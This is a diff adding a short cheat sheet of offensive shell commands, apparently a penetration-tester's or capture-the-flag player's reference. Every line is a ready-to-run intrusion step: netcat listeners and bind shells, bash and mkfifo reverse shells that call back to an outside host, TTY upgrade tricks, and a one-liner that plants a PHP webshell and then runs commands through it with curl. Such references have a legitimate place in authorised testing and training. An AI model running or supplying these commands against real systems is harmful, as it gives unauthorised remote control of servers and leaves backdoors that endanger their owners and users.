@@ -1,0 +1,10 @@
+===  SHELLS ===
+nc -lnvp 1234                                                               Start listener
+nc <ip> 1234                                                                Connect to bind shell
+bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'                         Start reverse shell from remote server (1)
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> 1234 >/tmp/f     Start reverse shell from remote server (2)
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f   Start bind shell on remote server
+python -c 'import pty; pty.spawn("/bin/bash")'                              Upgrade shell TTY (1)
+ctrl+z -> stty raw -echo -> fg -> enter twice                               Upgrade shell TTY (2)
+echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php             Create php webshell
+curl http://<ip>:<port>/shell.php?cmd=id                                    Execute command on webshell
